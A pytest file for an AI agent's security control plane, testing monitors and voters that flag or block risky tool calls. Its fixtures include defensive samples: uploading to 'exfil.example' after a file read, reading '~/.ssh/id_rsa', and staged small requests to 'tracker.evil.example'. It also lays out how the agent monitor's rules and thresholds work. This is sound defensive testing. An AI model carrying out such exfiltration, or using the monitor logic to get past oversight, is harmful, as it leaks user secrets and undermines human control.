"""M5 unit coverage for control-plane analyzers, trace, and consensus."""

from __future__ import annotations

import asyncio
import hashlib
import json
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from shisad.core.atomic_state import (
    AtomicWriteError,
    AtomicWriteStage,
    DurableAppendError,
    DurableAppendStage,
    StateLoadStatus,
    StatePersistenceDegradedError,
    encode_versioned_json_snapshot,
)
from shisad.core.events import (
    ControlPlaneActionObserved,
    ControlPlaneNetworkObserved,
    ControlPlaneResourceObserved,
    ProxyRequestEvaluated,
)
from shisad.core.providers.base import Message, ProviderResponse
from shisad.core.types import Capability
from shisad.security.control_plane.audit import ControlPlaneAuditLog
from shisad.security.control_plane.consensus import (
    ActionMonitorVoter,
    ConsensusInput,
    ConsensusPolicy,
    ConsensusVotingSystem,
    ResourceVoter,
    SequenceVoter,
    TraceVoter,
    VoteKind,
    VoterDecision,
)
from shisad.security.control_plane.engine import ControlPlaneEngine
from shisad.security.control_plane.history import ActionHistoryRecord, SessionActionHistoryStore
from shisad.security.control_plane.network import (
    BaselineDatabase,
    NetworkIntelligenceMonitor,
    extract_network_metadata,
)
from shisad.security.control_plane.resource import ResourceAccessMonitor
from shisad.security.control_plane.schema import (
    ActionKind,
    ControlDecision,
    ControlPlaneAction,
    Origin,
    RiskTier,
    build_action,
    contains_freeform_text,
    extract_request_size_bytes,
    infer_action_kind,
    sanitize_metadata_payload,
)
from shisad.security.control_plane.sequence import BehavioralSequenceAnalyzer
from shisad.security.control_plane.trace import (
    ExecutionTraceVerifier,
    PlanStage,
    PlanVerificationResult,
)


def _origin(session_id: str = "s1") -> Origin:
    return Origin(
        session_id=session_id,
        user_id="user-1",
        workspace_id="ws-1",
        actor="planner",
        trust_level="untrusted",
    )


def _append_recent_memory_read_burst(
    history: SessionActionHistoryStore,
    *,
    origin: Origin,
    now: datetime,
) -> None:
    for index, tool_name in enumerate(("note.list", "todo.list", "thread.list", "task.list")):
        history.append_action(
            ControlPlaneAction(
                timestamp=now + timedelta(milliseconds=index * 100),
                origin=origin,
                tool_name=tool_name,
                action_kind=ActionKind.MEMORY_READ,
                resource_id=f"memory:{index}",
            ),
            decision_status="allow",
        )


def test_m5_t1_sequence_detects_fs_read_then_egress() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin()

    read_action = build_action(
        tool_name="file.read",
        arguments={"path": "README.md"},
        origin=origin,
    )
    history.append_action(read_action, decision_status="allow")
    candidate = build_action(
        tool_name="http_request",
        arguments={"url": "https://exfil.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )

    findings = analyzer.analyze(history=history, candidate_action=candidate)
    assert any(item.pattern_name == "exfil_after_read" for item in findings)


def test_m5_rt1_sequence_detects_fs_read_then_egress_with_intervening_action() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s1-rt1")

    history.append_action(
        build_action(
            tool_name="file.read",
            arguments={"path": "README.md"},
            origin=origin,
        ),
        decision_status="allow",
    )
    history.append_action(
        build_action(
            tool_name="file.read",
            arguments={"path": "docs/ROADMAP.md"},
            origin=origin,
        ),
        decision_status="allow",
    )
    candidate = build_action(
        tool_name="http_request",
        arguments={"url": "https://exfil.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )

    findings = analyzer.analyze(history=history, candidate_action=candidate)
    assert any(item.pattern_name == "exfil_after_read" for item in findings)


@pytest.mark.asyncio
async def test_m5_t1b_sequence_voter_allows_web_search_after_read() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s1-t1b")

    history.append_action(
        build_action(
            tool_name="file.read",
            arguments={"path": "README.md"},
            origin=origin,
        ),
        decision_status="allow",
    )
    candidate = build_action(
        tool_name="web.search",
        arguments={"query": "latest news", "limit": 1},
        origin=origin,
        risk_tier=RiskTier.MEDIUM,
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={},
        )
    )
    assert vote.decision == VoteKind.ALLOW
    assert "sequence:allow_safe_egress_after_read" in vote.reason_codes


@pytest.mark.asyncio
async def test_m5_t1c_sequence_voter_blocks_http_request_after_read() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s1-t1c")

    history.append_action(
        build_action(
            tool_name="file.read",
            arguments={"path": "README.md"},
            origin=origin,
        ),
        decision_status="allow",
    )
    candidate = build_action(
        tool_name="http_request",
        arguments={"url": "https://exfil.example/upload"},
        origin=origin,
        risk_tier=RiskTier.HIGH,
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={},
        )
    )
    assert vote.decision == VoteKind.BLOCK


@pytest.mark.asyncio
async def test_gh54_sequence_voter_allows_trusted_reminder_list_after_recent_actions() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh54-reminder-list")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="reminder.list",
        action_kind=ActionKind.MEMORY_READ,
        resource_id="reminders",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "what reminders do we have?",
                "action_arguments": {"limit": 10},
            },
        )
    )

    assert vote.decision == VoteKind.ALLOW
    assert "sequence:allow_trusted_readonly_memory_after_rapid_fire" in vote.reason_codes


@pytest.mark.asyncio
async def test_gh54_sequence_voter_still_blocks_untrusted_reminder_list_rapid_fire() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh54-reminder-list-untrusted")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="reminder.list",
        action_kind=ActionKind.MEMORY_READ,
        resource_id="reminders",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": False,
                "operator_owned_cli_input": False,
                "raw_user_text": "",
                "action_arguments": {"limit": 10},
            },
        )
    )

    assert vote.decision == VoteKind.BLOCK


@pytest.mark.asyncio
async def test_gh54_sequence_voter_blocks_trusted_reminder_list_without_current_turn_intent() -> (
    None
):
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh54-reminder-list-unrelated")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="reminder.list",
        action_kind=ActionKind.MEMORY_READ,
        resource_id="reminders",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "what todos do we have?",
                "action_arguments": {"limit": 10},
            },
        )
    )

    assert vote.decision == VoteKind.BLOCK


@pytest.mark.parametrize(
    "raw_user_text",
    [
        "remind me to call dentist at 2030-01-01T09:00:00Z",
        "don't show reminders right now",
    ],
)
@pytest.mark.asyncio
async def test_gh54_sequence_voter_blocks_same_tool_non_list_reminder_mentions(
    raw_user_text: str,
) -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh54-reminder-list-non-list")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="reminder.list",
        action_kind=ActionKind.MEMORY_READ,
        resource_id="reminders",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": raw_user_text,
                "action_arguments": {"limit": 10},
            },
        )
    )

    assert vote.decision == VoteKind.BLOCK


@pytest.mark.asyncio
async def test_gh54_sequence_voter_blocks_sibling_memory_read_rapid_fire() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh54-memory-read-sibling")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="note.list",
        action_kind=ActionKind.MEMORY_READ,
        resource_id="notes",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "what notes do we have?",
                "action_arguments": {"limit": 10},
            },
        )
    )

    assert vote.decision == VoteKind.BLOCK


@pytest.mark.asyncio
async def test_gh94_sequence_voter_allows_structural_current_turn_file_read_after_burst() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh94-current-turn-file-read")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="fs.read",
        action_kind=ActionKind.FS_READ,
        resource_id="READMEE.md",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(
                allowed=False,
                reason_code="trace:tdg_confirmation_required",
                risk_tier=RiskTier.MEDIUM,
            ),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "action_arguments": {
                    "path": "READMEE.md",
                    "filesystem_intent": "current_turn_local_read",
                },
            },
        )
    )

    assert vote.decision == VoteKind.ALLOW
    assert "sequence:allow_structural_current_turn_filesystem_read" in vote.reason_codes


@pytest.mark.parametrize(
    "metadata_payload",
    [
        {
            "trusted_input": True,
            "operator_owned_cli_input": True,
            "action_arguments": {"path": "READMEE.md"},
        },
        {
            "trusted_input": False,
            "operator_owned_cli_input": False,
            "action_arguments": {
                "path": "READMEE.md",
                "filesystem_intent": "current_turn_local_read",
            },
        },
    ],
)
@pytest.mark.asyncio
async def test_gh94_sequence_voter_keeps_unbound_file_read_burst_blocked(
    metadata_payload: dict[str, Any],
) -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh94-unbound-file-read")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="fs.read",
        action_kind=ActionKind.FS_READ,
        resource_id="READMEE.md",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(
                allowed=False,
                reason_code="trace:tdg_confirmation_required",
                risk_tier=RiskTier.MEDIUM,
            ),
            network_metadata=[],
            declared_domains=[],
            metadata_payload=metadata_payload,
        )
    )

    assert vote.decision == VoteKind.BLOCK


@pytest.mark.asyncio
async def test_gh88_69_sequence_voter_allows_structural_current_turn_reminder() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh88-69-current-turn-reminder")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="reminder.create",
        action_kind=ActionKind.MEMORY_WRITE,
        resource_id="reminder:new",
    )

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(allowed=True, reason_code="trace:allowed"),
            network_metadata=[],
            declared_domains=[],
            metadata_payload={
                "trusted_input": True,
                "operator_owned_cli_input": True,
                "raw_user_text": "set a reminder in 2 min to do laundry",
                "action_arguments": {
                    "message": "do laundry",
                    "when": "in 2 minutes",
                    "reminder_intent": "current_turn_reminder_create",
                },
            },
        )
    )

    assert vote.decision == VoteKind.ALLOW
    assert "sequence:allow_structural_current_turn_reminder" in vote.reason_codes


@pytest.mark.parametrize(
    ("metadata_overrides", "trace_allowed"),
    [
        ({"action_arguments": {"message": "do laundry", "when": "in 2 minutes"}}, True),
        (
            {
                "action_arguments": {
                    "message": "archive credentials",
                    "when": "in 2 minutes",
                    "reminder_intent": "current_turn_reminder_create",
                }
            },
            True,
        ),
        ({"trusted_input": False}, True),
        ({"operator_owned_cli_input": False}, True),
        ({}, False),
    ],
)
@pytest.mark.asyncio
async def test_gh88_69_sequence_voter_rejects_unbound_or_untrusted_reminder_authority(
    metadata_overrides: dict[str, object],
    trace_allowed: bool,
) -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin("s-gh88-69-untrusted-reminder")
    now = datetime.now(UTC)
    _append_recent_memory_read_burst(history, origin=origin, now=now)
    candidate = ControlPlaneAction(
        timestamp=now + timedelta(milliseconds=450),
        origin=origin,
        tool_name="reminder.create",
        action_kind=ActionKind.MEMORY_WRITE,
        resource_id="reminder:new",
    )
    metadata_payload: dict[str, object] = {
        "trusted_input": True,
        "operator_owned_cli_input": True,
        "raw_user_text": "set a reminder in 2 min to do laundry",
        "action_arguments": {
            "message": "do laundry",
            "when": "in 2 minutes",
            "reminder_intent": "current_turn_reminder_create",
        },
    }
    metadata_payload.update(metadata_overrides)

    vote = await SequenceVoter(analyzer=analyzer, history=history).cast_vote(
        ConsensusInput(
            action=candidate,
            trace_result=PlanVerificationResult(
                allowed=trace_allowed,
                reason_code="trace:allowed" if trace_allowed else "trace:tdg_confirmation_required",
            ),
            network_metadata=[],
            declared_domains=[],
            metadata_payload=metadata_payload,
        )
    )

    assert vote.decision == VoteKind.BLOCK


def test_m5_t2_sequence_detects_rapid_fire_pattern() -> None:
    history = SessionActionHistoryStore()
    analyzer = BehavioralSequenceAnalyzer()
    origin = _origin()
    base = datetime.now(UTC)
    for index in range(4):
        history.append(
            ActionHistoryRecord(
                timestamp=base + timedelta(milliseconds=index * 100),
                session_id=origin.session_id,
                origin=origin,
                action_kind=ActionKind.FS_LIST,
                resource_id=f"/tmp/{index}",
                tool_name="file.read",
                decision_status="allow",
            )
        )

    candidate = ControlPlaneAction(
        timestamp=base + timedelta(milliseconds=500),
        origin=origin,
        tool_name="file.read",
        action_kind=ActionKind.FS_LIST,
        resource_id="/tmp/4",
    )
    findings = analyzer.analyze(history=history, candidate_action=candidate, now=base)
    assert any(item.pattern_name == "rapid_fire" for item in findings)


def test_h3_phantom_action_threshold_crossing_emits_single_finding(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "cp-h3-threshold")
    origin = _origin("h3-threshold")

    findings = []
    for index in range(3):
        findings = engine.observe_denied_action(
            action=build_action(
                tool_name="file.read",
                arguments={"path": f"/tmp/secret-{index}.txt"},
                origin=origin,
            ),
            source="policy_loop",
            reason_code="pep:missing_capabilities",
        )
        if index < 2:
            assert findings == []

    assert len(findings) == 1
    assert findings[0].pattern_name == "phantom_capability_probe"
    assert findings[0].reason_code == "sequence:phantom_capability_probe"
    assert findings[0].observation_count == 3

    deny_rows = engine.audit.query(
        event_type="denied_action_observed",
        session_id=origin.session_id,
    )
    phantom_rows = engine.audit.query(
        event_type="phantom_action_detected",
        session_id=origin.session_id,
    )
    assert len(deny_rows) == 3
    assert len(phantom_rows) == 1
    assert phantom_rows[0]["data"]["pattern_name"] == "phantom_capability_probe"
    assert phantom_rows[0]["data"]["observation_count"] == 3


def test_h3_nonqualifying_denies_do_not_emit_phantom_signal(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "cp-h3-filter")
    origin = _origin("h3-filter")

    for index in range(4):
        findings = engine.observe_denied_action(
            action=build_action(
                tool_name="file.read",
                arguments={"path": f"/tmp/schema-{index}.txt"},
                origin=origin,
            ),
            source="policy_loop",
            reason_code="pep:schema_validation_failed",
        )
        assert findings == []

    deny_rows = engine.audit.query(
        event_type="denied_action_observed",
        session_id=origin.session_id,
    )
    phantom_rows = engine.audit.query(
        event_type="phantom_action_detected",
        session_id=origin.session_id,
    )
    assert len(deny_rows) == 4
    assert phantom_rows == []


def test_h3_mixed_capability_rule_reason_codes_still_cross_threshold(tmp_path) -> None:
    engine = ControlPlaneEngine.build(data_dir=tmp_path / "cp-h3-mixed")
    origin = _origin("h3-mixed")

    findings = []
    for index, reason_code in enumerate(
        (
            "pep:missing_capabilities",
            "pep:tool_not_permitted",
            "pep:resource_authorization_failed",
        )
    ):
        findings = engine.observe_denied_action(
            action=build_action(
                tool_name="file.read",
                arguments={"path": f"/tmp/mixed-{index}.txt"},
                origin=origin,
            ),
            source="policy_loop",
            reason_code=reason_code,
        )
        if index < 2:
            assert findings == []

    assert len(findings) == 1
    assert findings[0].pattern_name == "phantom_capability_probe"
    assert findings[0].observation_count == 3


def test_h3_unattributed_egress_audit_stays_metadata_only(tmp_path) -> None:
    engine = ControlPlaneEngine.build(
        data_dir=tmp_path / "cp-h3-egress",
        phantom_deny_threshold=0,
    )
    origin = _origin("h3-egress")

    findings = []
    for host in ("one.example", "two.example"):
        findings = engine.observe_denied_action(
            action=build_action(
                tool_name="http_request",
                arguments={"url": f"https://{host}/upload"},
                origin=origin,
            ),
            source="policy_loop",
            reason_code="pep:destination_unattributed",
        )

    assert len(findings) == 1
    assert findings[0].pattern_name == "phantom_unattributed_egress"
    assert findings[0].observation_count == 2

    deny_rows = engine.audit.query(
        event_type="denied_action_observed",
        session_id=origin.session_id,
    )
    assert len(deny_rows) == 2
    assert deny_rows[0]["data"]["reason_code"] == "pep:destination_unattributed"
    assert "reason" not in deny_rows[0]["data"]


def test_m5_t3_resource_monitor_detects_credential_access() -> None:
    history = SessionActionHistoryStore()
    monitor = ResourceAccessMonitor()
    action = build_action(
        tool_name="file.read",
        arguments={"path": "~/.ssh/id_rsa"},
        origin=_origin(),
    )
    findings = monitor.analyze(history=history, candidate_action=action)
    assert any(item.reason_code == "resource:sensitive_access" for item in findings)


def test_rc_lus_resource_monitor_blocks_filesystem_paths_outside_workspace_root(
    tmp_path: Path,
) -> None:
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    history = SessionActionHistoryStore()
    monitor = ResourceAccessMonitor(workspace_roots=[workspace])
    action = build_action(
        tool_name="fs.list",
        arguments={"path": "/root"},
        origin=_origin(),
        workspace_roots=[workspace],
    )

    findings = monitor.analyze(history=history, candidate_action=action)

    assert any(
        item.reason_code == "resource:outside_workspace_root" and item.risk_tier == RiskTier.HIGH
        for item in findings
    )


def test_m5_t4_resource_monitor_detects_enumeration_pattern() -> None:
    history = SessionActionHistoryStore()
    monitor = ResourceAccessMonitor()
    origin = _origin()
    now = datetime.now(UTC)
    for index in range(20):
        history.append(
            ActionHistoryRecord(
                timestamp=now - timedelta(seconds=20),
                session_id=origin.session_id,
                origin=origin,
                action_kind=ActionKind.FS_LIST,
                resource_id=f"/tmp/enumerate/{index}",
                tool_name="file.read",
                decision_status="allow",
            )
        )

    candidate = build_action(
        tool_name="file.read",
        arguments={"path": "/tmp/enumerate/20"},
        origin=origin,
    )
    findings = monitor.analyze(history=history, candidate_action=candidate, now=now)
    assert any(item.reason_code == "resource:enumeration_many_resources" for item in findings)


def test_m5_t5_network_metadata_enrichment_is_correct() -> None:
    baseline = BaselineDatabase()
    monitor = NetworkIntelligenceMonitor(
        baseline_db=baseline,
        cache_ttl_seconds=-1,
    )
    origin = _origin()
    known = extract_network_metadata(
        origin=origin,
        tool_name="http_request",
        destination_host="api.good.com",
        destination_port=443,
        protocol="https",
        request_size=100,
    )
    monitor.record_learning(
        metadata=known,
        allow_or_confirmed=True,
        suspicious=False,
        lockdown=False,
    )
    current = extract_network_metadata(
        origin=origin,
        tool_name="http_request",
        destination_host="api.good.com",
        destination_port=443,
        protocol="https",
        request_size=120,
    )
    enrichment = monitor.enrich(metadata=current, declared_domains=["api.good.com"])
    assert enrichment["declared_domain"] is True
    assert enrichment["baseline_known"] is True
    assert enrichment["new_domain"] is False
    assert enrichment["size_delta_ratio"] > 0


@pytest.mark.asyncio
async def test_m5_t6_network_flags_new_domain_high_rate_small_requests() -> None:
    monitor = NetworkIntelligenceMonitor(
        baseline_db=BaselineDatabase(),
        cache_ttl_seconds=-1,
    )
    origin = _origin()
    now = datetime.now(UTC)
    decision = None
    for index in range(8):
        metadata = extract_network_metadata(
            origin=origin,
            tool_name="http_request",
            destination_host="tracker.evil.example",
            destination_port=443,
            protocol="https",
            request_size=64,
            timestamp=now + timedelta(seconds=index),
        )
        decision = await monitor.evaluate(
            metadata=metadata,
            declared_domains=[],
            risk_tier=RiskTier.HIGH,
        )
    assert decision is not None
    assert decision.decision == "BLOCK"
    assert "network:staged_exfil_small_requests" in decision.reason_codes


def test_m5_t7_plan_commit_hash_is_deterministic_and_correct() -> None:
    verifier = ExecutionTraceVerifier()
    committed_at = datetime(2026, 1, 1, tzinfo=UTC)
    expires_at = committed_at + timedelta(minutes=30)
    plan_a = verifier._commit_plan(
        session_id="sess-1",
        allowed_actions={ActionKind.FS_READ, ActionKind.FS_LIST},
        allowed_resources={"/tmp/*"},
        goal_resource_patterns=set(),
        declared_resource_roots=set(),
        forbidden_actions={ActionKind.SHELL_EXEC},
        max_actions=7,
        committed_at=committed_at,
        expires_at=expires_at,
        stage=PlanStage.STAGE1_PRECONTENT,
        amendment_of="",
    )
    plan_b = verifier._commit_plan(
        session_id="sess-1",
        allowed_actions={ActionKind.FS_READ, ActionKind.FS_LIST},
        allowed_resources={"/tmp/*"},
        goal_resource_patterns=set(),
        declared_resource_roots=set(),
        forbidden_actions={ActionKind.SHELL_EXEC},
        max_actions=7,
        committed_at=committed_at,
        expires_at=expires_at,
        stage=PlanStage.STAGE1_PRECONTENT,
        amendment_of="",
    )
    expected_payload = {
        "session_id": "sess-1",
        "allowed_actions": ["FS_LIST", "FS_READ"],
        "allowed_resources": ["/tmp/*"],
        "goal_resource_patterns": [],
        "declared_resource_roots": [],
        "forbidden_actions": ["SHELL_EXEC"],
        "max_actions": 7,
        "committed_at": committed_at.isoformat(),
        "expires_at": expires_at.isoformat(),
        "stage": PlanStage.STAGE1_PRECONTENT,
        "amendment_of": "",
    }
    expected_hash = hashlib.sha256(
        json.dumps(expected_payload, sort_keys=True).encode("utf-8")
    ).hexdigest()
    assert plan_a.plan_hash == plan_b.plan_hash == expected_hash


def test_m5_t8_trace_rejects_action_not_in_plan() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin()
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="summarize report",
        origin=origin,
    )
    action = build_action(tool_name="unknown_tool", arguments={}, origin=origin)
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:action_not_committed"


def test_m7_trace_stage1_shell_exec_requires_stage2_upgrade() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-shell-upgrade")
    verifier.begin_precontent_plan(
        session_id=origin.session_id,
        goal="inspect local repo",
        origin=origin,
    )
    action = build_action(
        tool_name="shell_exec",
        arguments={"command": ["python", "-c", "print('ok')"]},
        origin=origin,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:stage2_upgrade_required"


def test_m5_t9_trace_rejects_forbidden_action() -> None:
    verifier = ExecutionTraceVerifier()
    origin = _origin("s-forbidden")
    committed_at = datetime.now(UTC)
    plan = verifier._commit_plan(
        session_id=origin.session_id,
        allowed_actions={ActionKind.SHELL_EXEC},
        allowed_resources=set(),
        goal_resource_patterns=set(),
        declared_resource_roots=set(),
        forbidden_actions={ActionKind.SHELL_EXEC},
        max_actions=5,
        committed_at=committed_at,
        expires_at=committed_at + timedelta(minutes=5),
        stage=PlanStage.STAGE1_PRECONTENT,
        amendment_of="",
    )
    verifier._plans[origin.session_id] = plan
    action = build_action(
        tool_name="shell_exec",
        arguments={"command": ["python", "-c", "print('ok')"]},
        origin=origin,
    )
    result = verifier.verify_action(session_id=origin.session_id, action=action)
    assert result.allowed is False
    assert result.reason_code == "trace:forbidden_action"


@pytest.mark.parametrize("failed_trace_write", [1, 2])
@pytest.mark.parametrize("replace_plan_before_replay", [False, True])
def test_f2_execution_accounting_replays_each_trace_substep_idempotently(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    failed_trace_write: int,
    replace_plan_before_replay: bool,
) -> None:
    data_dir = tmp_path / (
        f"cp-f2-trace-replay-{failed_trace_write}-{replace_plan_before_replay}"
    )
    engine = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    origin = _origin(f"s-f2-trace-replay-{failed_trace_write}-{replace_plan_before_replay}")
    original_plan_hash = engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal=f"read {tmp_path / 'source.txt'}",
        origin=origin,
        ttl_seconds=300,
        max_actions=5,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="file.read",
        arguments={"path": str(tmp_path / "source.txt")},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    verifier = engine._trace_verifier
    real_persist = verifier._persist
    trace_writes = 0

    def _fail_one_trace_write() -> None:
        nonlocal trace_writes
        trace_writes += 1
        if trace_writes == failed_trace_write:
            raise OSError("simulated trace persistence interruption")
        real_persist()

    monkeypatch.setattr(verifier, "_persist", _fail_one_trace_write)
    idempotency_key = f"f2-trace-replay-{failed_trace_write}-{replace_plan_before_replay}"
    with pytest.raises(OSError, match="trace persistence interruption"):
        engine.record_execution(
            action=action,
            success=True,
            idempotency_key=idempotency_key,
        )

    if replace_plan_before_replay:
        engine.begin_precontent_plan(
            session_id=origin.session_id,
            goal=f"read {tmp_path / 'replacement.txt'}",
            origin=origin,
            ttl_seconds=300,
            max_actions=5,
            capabilities={Capability.FILE_READ},
        )

    engine.record_execution(
        action=action,
        success=True,
        idempotency_key=idempotency_key,
    )

    reloaded = ExecutionTraceVerifier(
        storage_path=data_dir / "control_plane" / "plans.json",
        workspace_roots=[tmp_path],
    )
    plan = reloaded.active_plan(origin.session_id)
    assert plan is not None
    if replace_plan_before_replay:
        assert plan.plan_hash != original_plan_hash
        assert plan.executed_actions == 0
        assert set(action.resource_ids).isdisjoint(plan.reachable_resources)
    else:
        assert plan.executed_actions == 1
        assert set(action.resource_ids).issubset(plan.reachable_resources)
    execution_rows = [
        json.loads(line)
        for line in (data_dir / "control_plane" / "history.jsonl")
        .read_text(encoding="utf-8")
        .splitlines()
        if line.strip()
    ]
    assert len(execution_rows) == 1
    assert execution_rows[0]["idempotency_key"] == idempotency_key
    assert execution_rows[0]["trace_plan_hash"] == original_plan_hash


@pytest.mark.parametrize("failed_trace_write", [1, 2])
def test_f2_hashless_execution_history_cancels_uncertain_active_plan(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    failed_trace_write: int,
) -> None:
    data_dir = tmp_path / f"cp-f2-hashless-trace-{failed_trace_write}"
    engine = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    origin = _origin(f"s-f2-hashless-trace-{failed_trace_write}")
    original_plan_hash = engine.begin_precontent_plan(
        session_id=origin.session_id,
        goal=f"read {tmp_path / 'source.txt'}",
        origin=origin,
        ttl_seconds=300,
        max_actions=5,
        capabilities={Capability.FILE_READ},
    )
    action = build_action(
        tool_name="file.read",
        arguments={"path": str(tmp_path / "source.txt")},
        origin=origin,
        workspace_roots=[tmp_path],
    )
    verifier = engine._trace_verifier
    real_persist = verifier._persist
    trace_writes = 0

    def _fail_one_trace_write() -> None:
        nonlocal trace_writes
        trace_writes += 1
        if trace_writes == failed_trace_write:
            raise OSError("simulated legacy trace persistence interruption")
        real_persist()

    monkeypatch.setattr(verifier, "_persist", _fail_one_trace_write)
    idempotency_key = f"f2-hashless-trace-{failed_trace_write}"
    with pytest.raises(OSError, match="legacy trace persistence interruption"):
        engine.record_execution(
            action=action,
            success=True,
            idempotency_key=idempotency_key,
        )

    history_path = data_dir / "control_plane" / "history.jsonl"
    history_rows = [json.loads(line) for line in history_path.read_text().splitlines()]
    assert history_rows[0].pop("trace_plan_hash") == original_plan_hash
    history_path.write_text(
        "\n".join(json.dumps(row, sort_keys=True) for row in history_rows) + "\n",
        encoding="utf-8",
    )

    restarted = ControlPlaneEngine.build(data_dir=data_dir, workspace_roots=[tmp_path])
    assert restarted.active_plan_hash(origin.session_id) == original_plan_hash

    restarted.record_execution(
        action=action,
        success=True,
        idempotency_key=idempotency_key,
    )

